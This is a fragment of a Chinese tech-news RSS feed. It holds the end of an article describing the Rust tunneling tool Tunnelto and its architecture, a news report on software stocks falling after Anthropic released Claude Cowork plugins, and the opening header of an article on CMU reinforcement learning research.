<p><strong>极简使用</strong></p>
<ul>
<li>一条命令即可使用，无需复杂配置</li>
<li>自动生成公共URL，开箱即用</li>
<li>支持多种安装方式</li>
</ul>
</li>
<li>
<p><strong>高性能异步IO</strong></p>
<ul>
<li>基于Rust和Tokio，性能优异</li>
<li>异步处理，支持高并发连接</li>
<li>低延迟，响应迅速</li>
</ul>
</li>
<li>
<p><strong>自定义子域名</strong></p>
<ul>
<li>支持指定自定义子域名</li>
<li>方便记忆和使用</li>
<li>适合生产环境使用</li>
</ul>
</li>
<li>
<p><strong>API认证</strong></p>
<ul>
<li>支持API密钥认证</li>
<li>保护隧道安全</li>
<li>防止未授权访问</li>
</ul>
</li>
<li>
<p><strong>本地仪表板</strong></p>
<ul>
<li>提供本地监控界面</li>
<li>查看请求日志和统计</li>
<li>方便调试和监控</li>
</ul>
</li>
<li>
<p><strong>自托管支持</strong></p>
<ul>
<li>可以部署自己的服务器</li>
<li>完全控制数据和隐私</li>
<li>支持分布式部署（使用Fly.io）</li>
</ul>
</li>
<li>
<p><strong>多协议支持</strong></p>
<ul>
<li>支持HTTP和HTTPS</li>
<li>自动处理协议转换</li>
<li>灵活配置</li>
</ul>
</li>
<li>
<p><strong>跨平台</strong></p>
<ul>
<li>支持macOS、Linux、Windows</li>
<li>提供多种安装方式</li>
<li>统一的命令行接口</li>
</ul>
</li>
</ol>
<h3 data-id="heading-16">项目优势</h3>





















































<table><thead><tr><th align="left">对比项</th><th align="left">Tunnelto</th><th align="left">ngrok</th><th align="left">localtunnel</th></tr></thead><tbody><tr><td align="left"><strong>性能</strong></td><td align="left">⭐⭐⭐⭐⭐ Rust异步IO</td><td align="left">⭐⭐⭐⭐ Go实现</td><td align="left">⭐⭐⭐ Node.js</td></tr><tr><td align="left"><strong>易用性</strong></td><td align="left">⭐⭐⭐⭐⭐ 一条命令</td><td align="left">⭐⭐⭐⭐ 简单</td><td align="left">⭐⭐⭐⭐ 简单</td></tr><tr><td align="left"><strong>自托管</strong></td><td align="left">✅ 完全支持</td><td align="left">❌ 需要付费</td><td align="left">✅ 支持但功能有限</td></tr><tr><td align="left"><strong>自定义域名</strong></td><td align="left">✅ 免费支持</td><td align="left">❌ 需要付费</td><td align="left">❌ 不支持</td></tr><tr><td align="left"><strong>开源</strong></td><td align="left">✅ MIT</td><td align="left">❌ 部分开源</td><td align="left">✅ MIT</td></tr><tr><td align="left"><strong>资源占用</strong></td><td align="left">⭐⭐⭐⭐⭐ 极低</td><td align="left">⭐⭐⭐⭐ 较低</td><td align="left">⭐⭐⭐ 中等</td></tr><tr><td align="left"><strong>社区活跃度</strong></td><td align="left">⭐⭐⭐⭐ 活跃</td><td align="left">⭐⭐⭐⭐⭐ 非常活跃</td><td align="left">⭐⭐⭐ 一般</td></tr></tbody></table>
<p><strong>为什么选择Tunnelto？</strong></p>
<ul>
<li><strong>性能优异</strong>：Rust和Tokio的组合带来极佳性能，适合高并发场景</li>
<li><strong>完全开源</strong>：MIT许可证，代码完全开放，可自由使用和修改</li>
<li><strong>自托管友好</strong>：提供完整的自托管方案，保护隐私和数据安全</li>
<li><strong>简单易用</strong>：一条命令即可使用，学习成本低</li>
<li><strong>资源占用低</strong>：Rust编译的二进制文件体积小，运行时占用资源少</li>
<li><strong>活跃维护</strong>：项目持续更新，社区活跃</li>
</ul>
<hr/>
<h2 data-id="heading-17">项目详细剖析</h2>
<h3 data-id="heading-18">架构设计</h3>
<p>Tunnelto采用<strong>客户端-服务器架构</strong>，包含三个核心组件：</p>
<ol>
<li><strong>Tunnelto Client</strong>：运行在用户本地的客户端，负责建立隧道</li>
<li><strong>Tunnelto Server</strong>：运行在云端的服务器，负责转发流量</li>
<li><strong>Control WebSocket</strong>：客户端和服务器之间的控制通道</li>
</ol>
<h4 data-id="heading-19">核心模块</h4>
<pre><code class="hljs language-arduino" lang="arduino">┌─────────────┐         ┌──────────────┐         ┌─────────────┐
│   Browser   │────────▶│ Tunnelto     │────────▶│   Local     │
│  (Internet)  │         │   <span class="hljs-built_in">Server</span>     │         │   <span class="hljs-built_in">Server</span>    │
└─────────────┘         └──────────────┘         └─────────────┘
                              ▲
                              │ Control WebSocket
                              │
                        ┌─────────────┐
                        │   <span class="hljs-built_in">Client</span>    │
                        │  (Local)    │
                        └─────────────┘
</code></pre>
<p><strong>工作流程</strong>：</p>
<ol>
<li><strong>建立控制连接</strong>：客户端通过WebSocket连接到服务器，建立控制通道</li>
<li><strong>注册隧道</strong>：客户端向服务器注册隧道，获得公共URL</li>
<li><strong>流量转发</strong>：当有请求到达公共URL时，服务器通过控制通道通知客户端</li>
<li><strong>建立数据连接</strong>：客户端建立到本地服务的连接</li>
<li><strong>双向转发</strong>：服务器和客户端双向转发HTTP请求和响应</li>
</ol>
<h3 data-id="heading-20">关键实现</h3>
<h4 data-id="heading-21">异步IO架构</h4>
<p>Tunnelto完全基于<strong>Tokio异步运行时</strong>，充分利用Rust的异步特性：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// 伪代码示例：核心异步处理逻辑</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">handle_tunnel_connection</span>(stream: TcpStream) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;()&gt; {
    <span class="hljs-comment">// 异步处理TCP连接</span>
    <span class="hljs-keyword">let</span> (reader, writer) = stream.<span class="hljs-title function_ invoke__">split</span>();
    
    <span class="hljs-comment">// 异步读取和写入</span>
    tokio::<span class="hljs-title function_ invoke__">spawn</span>(<span class="hljs-keyword">async</span> <span class="hljs-keyword">move</span> {
        <span class="hljs-comment">// 处理数据转发</span>
    });
    
    <span class="hljs-title function_ invoke__">Ok</span>(())
}
</code></pre>
<p><strong>优势</strong>：</p>
<ul>
<li><strong>高并发</strong>：单线程可处理大量并发连接</li>
<li><strong>低延迟</strong>：异步IO避免线程切换开销</li>
<li><strong>资源高效</strong>：相比传统多线程模型，资源占用更低</li>
</ul>
<h4 data-id="heading-22">隧道管理</h4>
<p>Tunnelto使用<strong>子域名路由</strong>来管理多个隧道：</p>
<ul>
<li>每个隧道分配一个唯一的子域名</li>
<li>服务器根据Host头路由到对应的隧道</li>
<li>支持自定义子域名，方便记忆和使用</li>
</ul>
<h4 data-id="heading-23">自托管实现</h4>
<p>Tunnelto提供了完整的自托管方案：</p>
<p><strong>单实例部署</strong>：</p>
<ul>
<li>编译musl目标（静态链接）</li>
<li>使用Docker部署</li>
<li>配置环境变量</li>
</ul>
<p><strong>分布式部署</strong>（官方方案）：</p>
<ul>
<li>使用Fly.io的Private Networking</li>
<li>实现Gossip协议进行服务发现</li>
<li>支持多实例负载均衡</li>
</ul>
<p><strong>关键配置</strong>（<code>tunnelto_server/src/config.rs</code>）：</p>
<ul>
<li><code>ALLOWED_HOSTS</code>：允许的主机名</li>
<li><code>CTRL_HOST</code>：控制服务器地址</li>
<li><code>CTRL_PORT</code>：控制服务器端口</li>
<li><code>CTRL_TLS_OFF</code>：是否禁用TLS（用于本地测试）</li>
</ul>
<h3 data-id="heading-24">安全机制</h3>
<ol>
<li>
<p><strong>API密钥认证</strong></p>
<ul>
<li>支持设置API密钥</li>
<li>防止未授权访问</li>
<li>保护隧道安全</li>
</ul>
</li>
<li>
<p><strong>TLS加密</strong></p>
<ul>
<li>默认使用HTTPS</li>
<li>端到端加密</li>
<li>保护数据传输安全</li>
</ul>
</li>
<li>
<p><strong>访问控制</strong></p>
<ul>
<li>支持配置允许的主机名</li>
<li>防止域名劫持</li>
<li>增强安全性</li>
</ul>
</li>
</ol>
<h3 data-id="heading-25">性能优化</h3>
<ol>
<li>
<p><strong>零拷贝技术</strong></p>
<ul>
<li>Rust的所有权系统避免不必要的内存拷贝</li>
<li>提高数据传输效率</li>
</ul>
</li>
<li>
<p><strong>连接池管理</strong></p>
<ul>
<li>复用TCP连接</li>
<li>减少连接建立开销</li>
</ul>
</li>
<li>
<p><strong>异步批处理</strong></p>
<ul>
<li>批量处理请求</li>
<li>提高吞吐量</li>
</ul>
</li>
</ol>
<h3 data-id="heading-26">扩展机制</h3>
<p>虽然Tunnelto本身功能相对简单，但提供了良好的扩展性：</p>
<ol>
<li>
<p><strong>自定义服务器</strong></p>
<ul>
<li>可以修改服务器代码</li>
<li>添加自定义功能</li>
<li>集成到现有系统</li>
</ul>
</li>
<li>
<p><strong>环境变量配置</strong></p>
<ul>
<li>通过环境变量灵活配置</li>
<li>支持不同部署场景</li>
<li>易于集成到CI/CD</li>
</ul>
</li>
<li>
<p><strong>API接口</strong></p>
<ul>
<li>控制WebSocket协议开放</li>
<li>可以开发自定义客户端</li>
<li>集成到其他工具</li>
</ul>
</li>
</ol>
<hr/>
<h2 data-id="heading-27">项目地址与资源</h2>
<h3 data-id="heading-28">官方资源</h3>
<ul>
<li>🌟 <strong>GitHub</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fagrinman%2Ftunnelto" target="_blank" title="https://github.com/agrinman/tunnelto" ref="nofollow noopener noreferrer">github.com/agrinman/tu…</a></li>
<li>📚 <strong>文档</strong>: GitHub README包含完整使用指南</li>
<li>🌐 <strong>官网</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Ftunnelto.dev" target="_blank" title="https://tunnelto.dev" ref="nofollow noopener noreferrer">tunnelto.dev</a></li>
</ul>
<h3 data-id="heading-29">适用人群</h3>
<p><strong>Tunnelto特别适合以下开发者</strong>：</p>
<ol>
<li>
<p><strong>Web开发者</strong></p>
<ul>
<li>需要快速暴露本地服务进行测试</li>
<li>需要集成第三方服务（OAuth、Webhook）</li>
<li>需要演示和分享本地项目</li>
</ul>
</li>
<li>
<p><strong>全栈工程师</strong></p>
<ul>
<li>需要让前端访问本地API</li>
<li>需要测试移动应用与后端集成</li>
<li>需要调试跨域问题</li>
</ul>
</li>
<li>
<p><strong>DevOps工程师</strong></p>
<ul>
<li>需要自托管内网穿透服务</li>
<li>需要集成到CI/CD流程</li>
<li>对性能和安全性有要求</li>
</ul>
</li>
<li>
<p><strong>Rust开发者</strong></p>
<ul>
<li>想学习Rust异步IO实践</li>
<li>想了解网络编程最佳实践</li>
<li>想贡献开源项目</li>
</ul>
</li>
<li>
<p><strong>对隐私有要求的开发者</strong></p>
<ul>
<li>不想使用第三方商业服务</li>
<li>需要完全控制数据</li>
<li>需要自托管解决方案</li>
</ul>
</li>
</ol>
<hr/>
<p><em>欢迎来我中的<a href="https://link.juejin.cn?target=https%3A%2F%2Fhome.wonlab.top" target="_blank" title="https://home.wonlab.top" ref="nofollow noopener noreferrer">个人主页</a>找到更多有用的知识和有趣的产品</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[昨夜，Claude智能体压垮华尔街，近万亿刀市值蒸发]]></title>    <link>https://juejin.cn/post/7602931486598414371</link>    <guid>https://juejin.cn/post/7602931486598414371</guid>    <pubDate>2026-02-05T10:03:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602931486598414371" data-draft-id="7603043152672653327" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="昨夜，Claude智能体压垮华尔街，近万亿刀市值蒸发"/> <meta itemprop="keywords" content="人工智能,OpenAI"/> <meta itemprop="datePublished" content="2026-02-05T10:03:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="机器之心"/> <meta itemprop="url" content="https://juejin.cn/user/1873223543167902"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            昨夜，Claude智能体压垮华尔街，近万亿刀市值蒸发
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1873223543167902/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    机器之心
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T10:03:53.000Z" title="Thu Feb 05 2026 10:03:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>AI 在代替人类之前，先要替代一大波软件？</p>
<p>昨夜，整个华尔街陷入了恐慌，Anthropic 发布的新一代人工智能工具「Claude Cowork」及其配套的 11 款职能插件正式上线，被市场视为 AI 从「辅助工具（Copilot）」向「独立员工（Agent）」跨越的分水岭，直接动摇了 SaaS 软件的商业根基。</p>
<p>从甲骨文、Adobe、Salesforce 到汤森路透、NEC，一系列人们耳熟能详的知名公司股票遭到抛售。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ecdad619ac3d45e48bc33e8b245fb4ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890633&amp;x-signature=04tAaZ%2B3m%2FFQFHLdbKicGnWvrfI%3D" alt="图片" loading="lazy"/></p>
<p>作为智能体时代的 AI 工具，Claude Cowork 远远超越了大模型聊天机器人的范畴。Cowork 可以直接在你的电脑上帮你干活，它拥有足够高的权限，可以接管你的鼠标、键盘和文件系统，按照你的模糊指令，自主规划并完成一连串复杂的工作。</p>
<p>另一方面，与最近很火的开源项目 ClawdBot 不同在于，为了防止 AI 误删文件或通过联网完成人们预料之外的操作，Claude Cowork 运行在隔离的虚拟机（VM）环境中。</p>
<p>这是一个更加严肃，一上来就被设计为用来干活的智能体。Anthropic 为 Claude Cowork 准备了一系列「职业技能包」，其表示，这些工具可以生成财务报表、研究销售线索、准备销售电话、起草客户支持回复、评估保密协议，以及审查合同、法律简报和构建财务模型。</p>
<p>初看起来，这些说法和过去很多大模型、智能体发布时 AI 公司宣传的情况类似。在 1 月 12 日 Claude Cowork 的「研究预览版」首次亮相时，大家只觉得这是一个性能更强的自动化工具。</p>
<p>然而到了 1 月 31 号，Anthropic 发布 11 款官方开源插件时，有人发现事情并没有这么简单。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d3e79f839c043b787a4062a43fdceec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890633&amp;x-signature=Fn7ip4IK4Y1oznUt10X6J2MydxA%3D" alt="图片" loading="lazy"/></p>
<p>Anthropic 为其「桌面级全能数字员工」Claude Cowork 智能体平台发布了一系列插件（<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fanthropics%2Fknowledge-work-plugins%25EF%25BC%2589%25EF%25BC%258C%25E8%25AF%25A5%25E5%2585%25AC%25E5%258F%25B8%25E5%25A3%25B0%25E7%25A7%25B0%25E8%25BF%2599%25E4%25BA%259B%25E6%258F%2592%25E4%25BB%25B6%25E5%258F%25AF%25E4%25BB%25A5%25E8%2587%25AA%25E5%258A%25A8%25E6%2589%25A7%25E8%25A1%258C%25E6%2595%25B0%25E5%258D%2581%25E9%25A1%25B9%25E4%25BB%25BB%25E5%258A%25A1%25EF%25BC%258C%25E5%258C%2585%25E6%258B%25AC%25E5%25AE%25A2%25E6%2588%25B7%25E6%259C%258D%25E5%258A%25A1%25E3%2580%2581%25E4%25BA%25A7%25E5%2593%2581%25E7%25AE%25A1%25E7%2590%2586%25E3%2580%2581%25E5%25B8%2582%25E5%259C%25BA%25E8%2590%25A5%25E9%2594%2580%25E3%2580%2581%25E6%25B3%2595%25E5%25BE%258B%25E5%2592%258C%25E6%2595%25B0%25E6%258D%25AE%25E5%2588%2586%25E6%259E%2590%25E7%25AD%2589%25E5%25B7%25A5%25E4%25BD%259C%25E3%2580%2582" target="_blank" title="https://github.com/anthropics/knowledge-work-plugins%EF%BC%89%EF%BC%8C%E8%AF%A5%E5%85%AC%E5%8F%B8%E5%A3%B0%E7%A7%B0%E8%BF%99%E4%BA%9B%E6%8F%92%E4%BB%B6%E5%8F%AF%E4%BB%A5%E8%87%AA%E5%8A%A8%E6%89%A7%E8%A1%8C%E6%95%B0%E5%8D%81%E9%A1%B9%E4%BB%BB%E5%8A%A1%EF%BC%8C%E5%8C%85%E6%8B%AC%E5%AE%A2%E6%88%B7%E6%9C%8D%E5%8A%A1%E3%80%81%E4%BA%A7%E5%93%81%E7%AE%A1%E7%90%86%E3%80%81%E5%B8%82%E5%9C%BA%E8%90%A5%E9%94%80%E3%80%81%E6%B3%95%E5%BE%8B%E5%92%8C%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E7%AD%89%E5%B7%A5%E4%BD%9C%E3%80%82" ref="nofollow noopener noreferrer">github.com/anthropics/…</a></p>
<p>和之前宣传说的差不多？然而这次人们开始担心，支撑科技和数字服务行业发展的软件服务（SaaS）商业模式即将面临颠覆性风险。</p>
<p>华尔街担心，像 Claude 插件这样的 AI 工具会挑战现有软件公司的数据分析和研究产品 —— 利用 AI 实现自动化并构建自有工具的公司可能会减少对外部研究和数据服务的订阅，这将直接损害软件公司的利润。</p>
<p>周二遭遇全面抛售后，标普 500 软件和服务指数板块下跌近 4%，连续第六个交易日下跌，自 1 月 28 日以来市值蒸发约 8300 亿美元。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/faa381774ab8447890b8c639e2f09b9d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890633&amp;x-signature=cDY5QlRxPyw50fDiqIXFjWXduEw%3D" alt="图片" loading="lazy"/></p>
<p>AI 工具最终是否会摧毁软件行业，目前尚无定论。但本周二，投资者们的恐慌是实实在在的，人们纷纷抛售法律和金融软件及服务公司的股票。毕竟，既然 AI 能减少内部开发所需的时间，那为什么还要为软件付费呢？</p>
<p>看起来，AI 对众多产业的革命正在具象化。今年 1 月，Anthropic 首席执行官达里奥・阿莫迪（Dario Amodei）就撰文认为「人工智能可能会在未来 1-5 年内取代一半的入门级白领工作」。</p>
<p>Anthropic 对此有多大的信心呢？他们昨天还强调了自己不会在 AI 里面加广告，宣传打到了超级碗，还顺带嘲讽了一波 OpenAI。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a24e50fe364e4f4a970c779903bdfc9e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890633&amp;x-signature=9QQ9M0dpiQN3caFh7dH1oa7l15k%3D" alt="图片" loading="lazy"/></p>
<p>OpenAI 创始人、CEO 山姆・奥特曼不得不出来回应。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/840b925d3f3a4608926b406908bd7eb7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890633&amp;x-signature=uiE43w0WvaC1Mb33MiesLv4RUOg%3D" alt="图片" loading="lazy"/></p>
<p>如此激烈的竞争，或许很快还会催生出更加强大的 AI 能力？</p>
<p>参考内容：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.cnn.com%2F2026%2F02%2F04%2Finvesting%2Fus-stocks-anthropic-software" target="_blank" title="https://www.cnn.com/2026/02/04/investing/us-stocks-anthropic-software" ref="nofollow noopener noreferrer">www.cnn.com/2026/02/04/…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.forbes.com%2Fsites%2Ftylerroush%2F2026%2F02%2F04%2Fglobal-software-stock-selloff-oracle-adobe-more-fueled-by-anthropics-new-ai-tools%2F" target="_blank" title="https://www.forbes.com/sites/tylerroush/2026/02/04/global-software-stock-selloff-oracle-adobe-more-fueled-by-anthropics-new-ai-tools/" ref="nofollow noopener noreferrer">www.forbes.com/sites/tyler…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.reuters.com%2Fbusiness%2Fmedia-telecom%2Fglobal-software-stocks-hit-by-anthropic-wake-up-call-ai-disruption-2026-02-04%2F" target="_blank" title="https://www.reuters.com/business/media-telecom/global-software-stocks-hit-by-anthropic-wake-up-call-ai-disruption-2026-02-04/" ref="nofollow noopener noreferrer">www.reuters.com/business/me…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.anthropic.com%2Fnews%2Fclaude-is-a-space-to-think" target="_blank" title="https://www.anthropic.com/news/claude-is-a-space-to-think" ref="nofollow noopener noreferrer">www.anthropic.com/news/claude…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[强化学习远不是最优，CMU刚刚提出最大似然强化学习]]></title>    <link>https://juejin.cn/post/7603195960254201856</link>    <guid>https://juejin.cn/post/7603195960254201856</guid>    <pubDate>2026-02-05T10:04:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603195960254201856" data-draft-id="7603043152672669711" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="强化学习远不是最优，CMU刚刚提出最大似然强化学习"/> <meta itemprop="keywords" content="人工智能,OpenAI"/> <meta itemprop="datePublished" content="2026-02-05T10:04:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="机器之心"/> <meta itemprop="url" content="https://juejin.cn/user/1873223543167902"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            强化学习远不是最优，CMU刚刚提出最大似然强化学习
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1873223543167902/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    机器之心
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T10:04:50.000Z" title="Thu Feb 05 2026 10:04:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
